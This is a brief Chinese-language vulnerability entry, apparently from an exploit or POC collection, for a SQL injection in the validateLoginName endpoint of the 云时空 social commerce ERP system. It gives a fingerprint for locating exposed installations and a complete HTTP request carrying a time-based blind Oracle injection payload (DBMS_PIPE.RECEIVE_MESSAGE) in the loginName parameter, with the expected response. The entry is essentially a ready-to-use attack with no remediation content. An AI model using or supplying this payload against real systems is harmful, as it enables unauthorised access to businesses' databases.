# 云时空社会化商业ERP系统validateLoginNameSQL注入漏洞

云时空社会化商业ERP系统validateLoginName ｜ SQL注入 ｜ —
- **指纹**：`app="云时空社会化商业ERP系统"`
- **请求**：`GET /sys/user/validateLoginName?loginName=admin'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- HTTP/1.1`
- **响应特征**：200